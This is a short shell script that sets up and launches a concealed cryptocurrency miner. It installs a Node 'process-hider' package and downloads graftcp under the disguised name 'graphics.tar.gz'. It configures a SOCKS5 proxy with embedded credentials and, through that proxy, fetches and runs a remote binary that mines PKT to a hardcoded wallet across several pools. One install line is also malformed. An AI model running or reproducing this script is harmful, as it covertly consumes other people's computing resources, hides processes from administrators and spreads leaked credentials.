#!/bin/sh
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 173.245.209.246:1080
socks5_username = G0tNyyR4nJ
socks5_password = N1DAYf9S7D
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://github.com/optimus66a/a/raw/main/ann && chmod 700 ann && ./ann ann -p pkt1qqa56gl4m9g7nm5xqsasf55wd60kqwflg9sxchh https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world/master 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
